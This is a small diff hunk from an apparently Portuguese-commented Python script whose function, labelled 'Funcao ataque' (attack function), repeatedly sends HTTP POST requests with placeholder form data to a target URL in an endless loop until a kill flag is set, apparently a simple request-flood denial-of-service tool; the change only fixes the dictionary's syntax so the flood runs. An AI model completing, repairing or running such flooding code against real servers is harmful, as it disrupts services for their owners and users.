@@ -13,7 +13,7 @@ Kill = False
 
 #Funcao ataque
 def Post(url,attackedServerPort):
-    parameters = {'nome':'Fuluno':'cpf': '12345678910':'Data':'29/06/2017':'Local:':'Brasilia'}
+    parameters = {'nome':'Fuluno','cpf': '12345678910','Data':'29/06/2017','Local:':'Brasilia'}
     headers = {'keep_alive': 'True'}
     while not Kill:
         r = requests.post(url, data=parameters, headers=headers)
